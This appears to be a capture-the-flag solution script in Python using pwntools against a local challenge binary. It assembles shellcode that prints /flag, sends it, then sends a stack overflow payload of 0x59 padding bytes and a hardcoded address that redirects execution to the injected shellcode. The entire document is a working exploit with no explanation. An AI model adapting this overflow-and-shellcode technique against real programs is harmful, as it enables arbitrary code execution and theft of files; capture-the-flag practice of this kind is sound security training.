import sys
from pwn import *

p = process('/challenge/binary-exploitation-hijack-to-mmap-shellcode-w')
context.arch = 'amd64'

shellcode = asm(shellcraft.cat("/flag"))
p.send(shellcode)

payload = b"A" * 0x59
win = p64(0x31182000)
payload += win
p.send(payload)
p.interactive()
